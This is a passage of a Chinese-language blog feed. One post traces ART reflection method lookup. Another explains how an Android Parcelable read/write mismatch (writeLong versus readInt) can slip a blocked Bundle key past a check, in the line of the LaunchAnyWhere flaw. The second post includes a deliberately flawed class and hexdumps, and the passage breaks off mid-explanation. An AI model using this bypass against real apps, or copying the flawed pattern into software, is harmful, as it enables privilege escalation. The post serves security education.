class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;PointerSize kPointerSize, <span class="keyword">bool</span> kTransactionActive&gt;</span><br><span class="line">ObjPtr&lt;Method&gt; Class::GetDeclaredMethodInternal(</span><br><span class="line">    Thread* self,</span><br><span class="line">    ObjPtr&lt;Class&gt; klass,  类</span><br><span class="line">    ObjPtr&lt;String&gt; name,  方法名</span><br><span class="line">    ObjPtr&lt;ObjectArray&lt;Class&gt;&gt; args) &#123;  参数类型列表</span><br><span class="line">  <span class="comment">// Covariant return types permit the class to define multiple</span></span><br><span class="line">  <span class="comment">// methods with the same name and parameter types. Prefer to</span></span><br><span class="line">  <span class="comment">// return a non-synthetic method in such situations. We may</span></span><br><span class="line">  <span class="comment">// still return a synthetic method to handle situations like</span></span><br><span class="line">  <span class="comment">// escalated visibility. We never return miranda methods that</span></span><br><span class="line">  <span class="comment">// were synthesized by the runtime.</span></span><br><span class="line">  StackHandleScope&lt;<span class="number">3</span>&gt; hs(self);</span><br><span class="line">  <span class="keyword">auto</span> h_method_name = hs.NewHandle(name);</span><br><span class="line">  <span class="keyword">if</span> (UNLIKELY(h_method_name == <span class="literal">nullptr</span>)) &#123;</span><br><span class="line">    ThrowNullPointerException(<span class="string">"name == null"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> h_args = hs.NewHandle(args);</span><br><span class="line">  Handle&lt;Class&gt; h_klass = hs.NewHandle(klass);</span><br><span class="line">  ArtMethod* result = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="comment">//这里看字面意思就是获取这个类的虚方法的列表,进行遍历,GetDeclaredVirtualMethods的代码我稍微跟了下,最后就是返回一个ArraySlice&lt;ArtMethod&gt;集合,过程涉及到一些偏移什么的,应该相对底层了,这里先不深究了</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; m : h_klass-&gt;GetDeclaredVirtualMethods(kPointerSize)) &#123;</span><br><span class="line">    <span class="keyword">auto</span>* np_method = m.GetInterfaceMethodIfProxy(kPointerSize);</span><br><span class="line">    <span class="comment">// May cause thread suspension.</span></span><br><span class="line">    ObjPtr&lt;String&gt; np_name = np_method-&gt;GetNameAsString(self);</span><br><span class="line">    <span class="comment">//这里的操作也比较直接,就是对比方法名称和参数列表是否相等,下面那个循环的操作也比较类似</span></span><br><span class="line">    <span class="keyword">if</span> (!np_name-&gt;Equals(h_method_name.Get()) || !np_method-&gt;EqualParameters(h_args)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (UNLIKELY(self-&gt;IsExceptionPending())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!m.IsMiranda()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!m.IsSynthetic()) &#123;</span><br><span class="line">        <span class="keyword">return</span> Method::CreateFromArtMethod&lt;kPointerSize, kTransactionActive&gt;(self, &amp;m);</span><br><span class="line">      &#125;</span><br><span class="line">      result = &amp;m;  <span class="comment">// Remember as potential result if it's not a miranda method.</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (result == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; m : h_klass-&gt;GetDirectMethods(kPointerSize)) &#123;</span><br><span class="line">      <span class="keyword">auto</span> modifiers = m.GetAccessFlags();</span><br><span class="line">      <span class="keyword">if</span> ((modifiers &amp; kAccConstructor) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">auto</span>* np_method = m.GetInterfaceMethodIfProxy(kPointerSize);</span><br><span class="line">      <span class="comment">// May cause thread suspension.</span></span><br><span class="line">      ObjPtr&lt;String&gt; np_name = np_method-&gt;GetNameAsString(self);</span><br><span class="line">      <span class="keyword">if</span> (np_name == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        self-&gt;AssertPendingException();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!np_name-&gt;Equals(h_method_name.Get()) || !np_method-&gt;EqualParameters(h_args)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (UNLIKELY(self-&gt;IsExceptionPending())) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      DCHECK(!m.IsMiranda());  <span class="comment">// Direct methods cannot be miranda methods.</span></span><br><span class="line">      <span class="keyword">if</span> ((modifiers &amp; kAccSynthetic) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Method::CreateFromArtMethod&lt;kPointerSize, kTransactionActive&gt;(self, &amp;m);</span><br><span class="line">      &#125;</span><br><span class="line">      result = &amp;m;  <span class="comment">// Remember as potential result.</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result != <span class="literal">nullptr</span></span><br><span class="line">      ? Method::CreateFromArtMethod&lt;kPointerSize, kTransactionActive&gt;(self, result)</span><br><span class="line">      : <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这些其实不是我的重点..我的疑问其实出在GetNameAsString中<br>字面意思其实蛮好理解的,就是获取名称的字符串,然而<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ObjPtr&lt;mirror::String&gt; ArtMethod::GetNameAsString(Thread* self) &#123;</span><br><span class="line">  CHECK(!IsProxyMethod());</span><br><span class="line">  StackHandleScope&lt;<span class="number">1</span>&gt; hs(self);</span><br><span class="line">  Handle&lt;mirror::DexCache&gt; dex_cache(hs.NewHandle(GetDexCache()));</span><br><span class="line">  <span class="keyword">auto</span>* dex_file = dex_cache-&gt;GetDexFile();</span><br><span class="line">  <span class="keyword">uint32_t</span> dex_method_idx = GetDexMethodIndex();</span><br><span class="line">  <span class="keyword">const</span> DexFile::MethodId&amp; method_id = dex_file-&gt;GetMethodId(dex_method_idx);</span><br><span class="line">  <span class="keyword">return</span> Runtime::Current()-&gt;GetClassLinker()-&gt;ResolveString(method_id.name_idx_, dex_cache);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在IsProxyMethod中的返回值为true,导致CHECK(!IsProxyMethod())报check failed,导致程序终止了<br>有些东西涉及到工作的具体内容这里就不说了,但是确实比较玄学..</p><p>还是得想办法摸索一下看看</p><p>代理方法这个东西,我其实没怎么查到相关信息</p><blockquote><p>至于代理方法，由于是动态生成的（没有对应的DEX字节码），因此即使ART虚拟机运行在解释模式中，它们也不通过解释器来执行（这一点猜测的，还没有确认）。</p></blockquote><p>上文中的GetNameAsString实现的最后的return语句,看起来是向dex缓存来找对应的方法名称,但是如果是代理方法,就是没有对应的dex字节码,就肯定是找不到了,所以在执行这个方法的最前面就会进行这个check<br>看一下IsProxyMethod的具体实现<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="keyword">bool</span> ArtMethod::IsProxyMethod() &#123;</span><br><span class="line">  DCHECK(!IsRuntimeMethod()) &lt;&lt; <span class="string">"ArtMethod::IsProxyMethod called on a runtime method"</span>;</span><br><span class="line">  <span class="comment">// Avoid read barrier since the from-space version of the class will have the correct proxy class</span></span><br><span class="line">  <span class="comment">// flags since they are constant for the lifetime of the class.</span></span><br><span class="line">  <span class="keyword">return</span> GetDeclaringClass&lt;kWithoutReadBarrier&gt;()-&gt;IsProxyClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>大概是这样,emmm…我刚刚好像找到为什么报错了,公司的代码重写了这个部分,细节这里不贴出来了,可能是那个重写的部分没有对这个方法有正确的返回值,所以会出错.</p><p>嗯大概是这样吧,算是比较水的分析了一下反射找到方法的流程,还好找着为什么报错了要不然就要被连人带椅子扔出去了.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;art-反射-获取方法实例的流程&quot;&gt;&lt;a href=&quot;#art-反射-获取方法实例的流程&quot; class=&quot;headerlink&quot; title=&quot;art 反射 获取方法实例的流程&quot;&gt;&lt;/a&gt;art 反射 获取方法实例的流程&lt;/h2&gt;&lt;h4 id=&quot;java层&quot;&gt;&lt;a href=&quot;#java层&quot; class=&quot;headerlink&quot; title=&quot;java层&quot;&gt;&lt;/a&gt;java层&lt;/h4&gt;&lt;p&gt;java这层就简单一点说了,获取到class对象以后,使用getDeclaredMethod,然后调用getMethod,调用到getDeclaredMethodInternal.&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Android 序列化反序列化不匹配造成的一个安全问题</title>
    <link href="http://yoursite.com/2018/06/17/Android-%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%8C%B9%E9%85%8D%E9%80%A0%E6%88%90%E7%9A%84%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/06/17/Android-%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%8C%B9%E9%85%8D%E9%80%A0%E6%88%90%E7%9A%84%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</id>
    <published>2018-06-16T17:47:26.000Z</published>
    <updated>2020-07-28T14:07:02.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Android中的序列化反序列化不匹配导致的漏洞解析"><a href="#Android中的序列化反序列化不匹配导致的漏洞解析" class="headerlink" title="Android中的序列化反序列化不匹配导致的漏洞解析"></a>Android中的序列化反序列化不匹配导致的漏洞解析</h2><blockquote><p>本文仅供安全技术交流,请勿用于不正当的用途,造成的一切后果与本文作者无关.</p></blockquote><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>上一次提到了<a href="https://github.com/EggUncle/LaunchAnyWhere" target="_blank" rel="noopener">launchAnyWhere</a>这个漏洞,其中提到了修补方案,就是去验证intent指向的app和appB是不是有相同签名的,这里有这样一段:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if (result != null</span><br><span class="line">+                    &amp;&amp; (intent = result.getParcelable(AccountManager.KEY_INTENT)) != null) &#123;</span><br><span class="line">+                /*</span><br><span class="line">+                 * The Authenticator API allows third party authenticators to</span><br><span class="line">+                 * supply arbitrary intents to other apps that they can run,</span><br><span class="line">+                 * this can be very bad when those apps are in the system like</span><br><span class="line">+                 * the System Settings.</span><br><span class="line">+                 */</span><br><span class="line">+                PackageManager pm = mContext.getPackageManager();</span><br><span class="line">+                ResolveInfo resolveInfo = pm.resolveActivity(intent, 0);</span><br><span class="line">+                int targetUid = resolveInfo.activityInfo.applicationInfo.uid;</span><br><span class="line">+                int authenticatorUid = Binder.getCallingUid();</span><br><span class="line">+                if (PackageManager.SIGNATURE_MATCH !=</span><br><span class="line">+                        pm.checkSignatures(authenticatorUid, targetUid)) &#123;</span><br><span class="line">+                    throw new SecurityException(</span><br><span class="line">+                            &quot;Activity to be started with KEY_INTENT must &quot; +</span><br><span class="line">+                            &quot;share Authenticator&apos;s signatures&quot;);</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br></pre></td></tr></table></figure></p><p>可以看到这里有检查result.getParcelable(AccountManager.KEY_INTENT)是否为空,如果不是,就对他进行检查.那有没有绕过的方法?</p><p>有的</p><a id="more"></a><h3 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h3><h4 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h4><p>直接上官方文档把</p><blockquote><p>A mapping from String keys to various Parcelable values.</p></blockquote><p>bundle常用在Activity中传递数据,可以传递序列化的对象.</p><h4 id="Bundle格式"><a href="#Bundle格式" class="headerlink" title="Bundle格式"></a>Bundle格式</h4><p>首先我们先说一下如何将bundle信息dump到本地并查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle = new Bundle();</span><br><span class="line">bundle.readFromParcel(targetParcel);</span><br><span class="line">...............</span><br><span class="line"></span><br><span class="line">public static void dumpBundle(Parcel parcel, String name) &#123;</span><br><span class="line">    byte[] data = parcel.marshall();</span><br><span class="line">    try &#123;</span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(&quot;/sdcard/&quot; + name + &quot;.data&quot;);</span><br><span class="line">        fileOutputStream.write(data);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们先生成一个简单的bundle数据再保存到本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle=new Bundle();</span><br><span class="line">      bundle.putInt(&quot;intkey&quot;,123);</span><br><span class="line">      bundle.putChar(&quot;charkey&quot;,&apos;a&apos;);</span><br><span class="line"></span><br><span class="line">      Test test=new Test(1);</span><br><span class="line">      Parcel parcel=Parcel.obtain();</span><br><span class="line">      bundle.putParcelable(&quot;testkey&quot;,test);</span><br><span class="line">      bundle.writeToParcel(parcel,0);</span><br><span class="line">      byte[] data=parcel.marshall();</span><br><span class="line"></span><br><span class="line">dumpBundle(parcel,&quot;test&quot;)</span><br></pre></td></tr></table></figure></p><p>Test类是实现parcelable接口的类,其中只有一个属性int num;</p><p>dump到本地后,可以用hexdump vim或者010editor打开,这里就用hexdump打开了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C test.data</span><br><span class="line"></span><br><span class="line">00000000  f8 00 00 00 42 4e 44 4c  03 00 00 00 07 00 00 00  |....BNDL........|</span><br><span class="line">00000010  74 00 65 00 73 00 74 00  6b 00 65 00 79 00 00 00  |t.e.s.t.k.e.y...|</span><br><span class="line">00000020  04 00 00 00 1c 00 00 00  63 00 6f 00 6d 00 2e 00  |........c.o.m...|</span><br><span class="line">00000030  65 00 67 00 67 00 75 00  6e 00 63 00 6c 00 65 00  |e.g.g.u.n.c.l.e.|</span><br><span class="line">00000040  2e 00 64 00 75 00 6d 00  70 00 62 00 75 00 6e 00  |..d.u.m.p.b.u.n.|</span><br><span class="line">00000050  64 00 6c 00 65 00 2e 00  54 00 65 00 73 00 74 00  |d.l.e...T.e.s.t.|</span><br><span class="line">00000060  00 00 00 00 01 00 00 00  06 00 00 00 69 00 6e 00  |............i.n.|</span><br><span class="line">00000070  74 00 6b 00 65 00 79 00  00 00 00 00 01 00 00 00  |t.k.e.y.........|</span><br><span class="line">00000080  7b 00 00 00 07 00 00 00  63 00 68 00 61 00 72 00  |&#123;.......c.h.a.r.|</span><br><span class="line">00000090  6b 00 65 00 79 00 00 00  15 00 00 00 13 00 00 00  |k.e.y...........|</span><br><span class="line">000000a0  6a 00 61 00 76 00 61 00  2e 00 6c 00 61 00 6e 00  |j.a.v.a...l.a.n.|</span><br><span class="line">000000b0  67 00 2e 00 43 00 68 00  61 00 72 00 61 00 63 00  |g...C.h.a.r.a.c.|</span><br><span class="line">000000c0  74 00 65 00 72 00 00 00  32 00 00 00 ac ed 00 05  |t.e.r...2.......|</span><br><span class="line">000000d0  73 72 00 13 6a 61 76 61  2e 6c 61 6e 67 2e 43 68  |sr..java.lang.Ch|</span><br><span class="line">000000e0  61 72 61 63 74 65 72 34  8b 47 d9 6b 1a 26 78 02  |aracter4.G.k.&amp;x.|</span><br><span class="line">000000f0  00 01 43 00 05 76 61 6c  75 65 78 70 00 61 00 00  |..C..valuexp.a..|</span><br><span class="line">00000100</span><br></pre></td></tr></table></figure></p><p>整个数据为小端</p><p>f8 00 00 00 是bundle长度<br><br>42 4e 44 4c 是bundle的魔数<br><br>03 00 00 00 是bundle包含的key-value的数量<br><br>07 00 00 00 是第一个键值对的长度,以两个字节为单位<br><br>74 00 65 00 73 00 74 00  6b 00 65 00 79 00 即第一个key 内容为testkey<br>00 00 这个我一直没搞清楚是干嘛的,感觉像是为了对齐<br>04 00 00 00 代表序列化对象,这个值对应的类型定义在<a href="http://androidxref.com/8.0.0_r4/xref/frameworks/base/core/java/android/os/Parcel.java" target="_blank" rel="noopener">Parcel.java</a>中,这里截取一小段源码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">215    // Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.</span><br><span class="line">216    private static final int VAL_NULL = -1;</span><br><span class="line">217    private static final int VAL_STRING = 0;</span><br><span class="line">218    private static final int VAL_INTEGER = 1;</span><br><span class="line">219    private static final int VAL_MAP = 2;</span><br><span class="line">220    private static final int VAL_BUNDLE = 3;</span><br><span class="line">221    private static final int VAL_PARCELABLE = 4;</span><br><span class="line">222    private static final int VAL_SHORT = 5;</span><br><span class="line">223    private static final int VAL_LONG = 6;</span><br><span class="line">224    private static final int VAL_FLOAT = 7;</span><br><span class="line">225    private static final int VAL_DOUBLE = 8;</span><br><span class="line">226    private static final int VAL_BOOLEAN = 9;</span><br><span class="line">227    private static final int VAL_CHARSEQUENCE = 10;</span><br><span class="line">228    private static final int VAL_LIST  = 11;</span><br><span class="line">229    private static final int VAL_SPARSEARRAY = 12;</span><br><span class="line">230    private static final int VAL_BYTEARRAY = 13;</span><br><span class="line">231    private static final int VAL_STRINGARRAY = 14;</span><br><span class="line">232    private static final int VAL_IBINDER = 15;</span><br><span class="line">233    private static final int VAL_PARCELABLEARRAY = 16;</span><br><span class="line">234    private static final int VAL_OBJECTARRAY = 17;</span><br><span class="line">235    private static final int VAL_INTARRAY = 18;</span><br><span class="line">236    private static final int VAL_LONGARRAY = 19;</span><br><span class="line">237    private static final int VAL_BYTE = 20;</span><br><span class="line">238    private static final int VAL_SERIALIZABLE = 21;</span><br><span class="line">239    private static final int VAL_SPARSEBOOLEANARRAY = 22;</span><br><span class="line">240    private static final int VAL_BOOLEANARRAY = 23;</span><br><span class="line">241    private static final int VAL_CHARSEQUENCEARRAY = 24;</span><br><span class="line">242    private static final int VAL_PERSISTABLEBUNDLE = 25;</span><br><span class="line">243    private static final int VAL_SIZE = 26;</span><br><span class="line">244    private static final int VAL_SIZEF = 27;</span><br><span class="line">245    private static final int VAL_DOUBLEARRAY = 28;</span><br></pre></td></tr></table></figure><p>1c 00 00 00 为序列化的类名的长度,此处为28,因为是两个字节为一个单位,所以这里就是56个字节<br>63 00 6f 00 6d 00 2e 00<br><br>65 00 67 00 67 00 75 00<br><br>6e 00 63 00 6c 00 65 00<br><br>2e 00 64 00 75 00 6d 00<br><br>70 00 62 00 75 00 6e 00<br><br>64 00 6c 00 65 00 2e 00<br><br>54 00 65 00 73 00 74 00<br><br>对应的值为com.egguncle.dumpbundle.Test<br><br>00 00 00 00 这四个字节我也没弄清楚作用,但是在每一个键结束之后都有这个,大概是把键值分开?但是下面的char键值对并没有这样<br><br>01 00 00 00 这个就是序列化中类的属性的值,此处值为1 <br><br>06 00 00 00 第二个键值对的长度<br><br>69 00 6e 00 74 00 6b 00 65 00 79 00 这里就是第二个键值对的键内容 intkey<br><br>00 00 00 00 又是这个熟悉的四个字节<br><br>01 00 00 00 代表内容为int类型<br><br>7b 00 00 00 代表值,7b转换成十进制是123<br><br>后面就不再分析了,后续在实现的时候会详细分析我们的bundle数据<br></p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/img1.jpeg?raw=true" alt=""></p><h3 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h3><p>我们现在来写一个demo,大致功能是,在MainActivity中,给intent设置一些bundle数据,并启动第二个界面Main2Activity,但是在启动之前做一个检测,当检测到恶意数据的时候,就拒绝启动Main2Activity,但是在界面Main2Activity中,会尝试获取这个键值对并获取它的一些信息,我知道这个场景可能显得比较沙雕…但是我们的重点不是这个,我们的重点是,如何在activity1中绕过这个检测限制?</p><p>首先来看一下界面1中的限制的代码,比如说我们要传入的恶意键值对的键是evilkv,值是一个序列化对象,那这里就读取这个键,如果返回值不为空,那就说明键值对存在.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private boolean checkBundle(Bundle bundle) &#123;</span><br><span class="line">    if (bundle.getParcelable(&quot;evilkv&quot;) != null) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们先尝试一下常规操作,就是将恶意键值对存到bundle里面,在将bundle给intent,看看会怎么样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Bundle testBundle=new Bundle();</span><br><span class="line">EvilParcel evilParcel=new EvilParcel(&quot;evil data&quot;);</span><br><span class="line">testBundle.putParcelable(&quot;evilkv&quot;,evilParcel);</span><br><span class="line">if (checkBundle(testBundle))&#123;</span><br><span class="line">    Intent intent = new Intent(MainActivity.this, Main2Activity.class);</span><br><span class="line">    intent.putExtras(testBundle);</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    Log.i(TAG, &quot;there is a evilkv!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>界面这里就不截图了,就是一个按钮,点击以后执行上面的代码,我们多点几下<br><br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-15%2019-14-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>界面2没有启动,而且log也输出了there is a evilkv! 说明还是被检测到了,接下来就是重点了,如何绕过?</p><h3 id="0x03-利用序列化反序列化不匹配来绕过键值检测"><a href="#0x03-利用序列化反序列化不匹配来绕过键值检测" class="headerlink" title="0x03 利用序列化反序列化不匹配来绕过键值检测"></a>0x03 利用序列化反序列化不匹配来绕过键值检测</h3><p>假设这个类里面有这样一个支持序列化的类:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public class MyMismatchParcel implements Parcelable &#123;</span><br><span class="line"></span><br><span class="line">    private final static String TAG=&quot;MYTEST_MyMismatchParcel&quot;;</span><br><span class="line"></span><br><span class="line">    private int mDataInt;</span><br><span class="line"></span><br><span class="line">    public int getmDataInt() &#123;</span><br><span class="line">        return mDataInt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected MyMismatchParcel(Parcel in) &#123;</span><br><span class="line">        readFromParcel(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static final Creator&lt;MyMismatchParcel&gt; CREATOR = new Creator&lt;MyMismatchParcel&gt;() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public MyMismatchParcel createFromParcel(Parcel in) &#123;</span><br><span class="line">            return new MyMismatchParcel(in);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public MyMismatchParcel[] newArray(int size) &#123;</span><br><span class="line">            return new MyMismatchParcel[size];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int describeContents() &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void writeToParcel(Parcel parcel, int i) &#123;</span><br><span class="line">        parcel.writeLong(mDataInt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void readFromParcel(Parcel in) &#123;</span><br><span class="line">        mDataInt = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个类有一个小问题,在序列化和反序列化时,因为一些疏忽,对同一个属性,写时使用了writeLong,读时使用了readInt,这看起来只是一个不起眼的小错误,接下来我们看看如何利用它.</p><p>首先先明确一下,由于它的读写过程不匹配,读时为int,即4字节,而写时作为long,为8字节,且bundle为小端,则在一次读写之后,它的后面将会出现四个字节的错位,即 00 00 00 00,如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000  90 00 00 00 42 4e 44 4c  01 00 00 00 06 00 00 00  |....BNDL........|</span><br><span class="line">00000010  6d 00 79 00 74 00 65 00  73 00 74 00 00 00 00 00  |m.y.t.e.s.t.....|</span><br><span class="line">00000020  04 00 00 00 35 00 00 00  63 00 6f 00 6d 00 2e 00  |....5...c.o.m...|</span><br><span class="line">00000030  65 00 67 00 67 00 75 00  6e 00 63 00 6c 00 65 00  |e.g.g.u.n.c.l.e.|</span><br><span class="line">00000040  2e 00 6d 00 69 00 73 00  6d 00 61 00 74 00 63 00  |..m.i.s.m.a.t.c.|</span><br><span class="line">00000050  68 00 70 00 61 00 72 00  63 00 65 00 6c 00 61 00  |h.p.a.r.c.e.l.a.|</span><br><span class="line">00000060  62 00 6c 00 65 00 2e 00  64 00 61 00 74 00 61 00  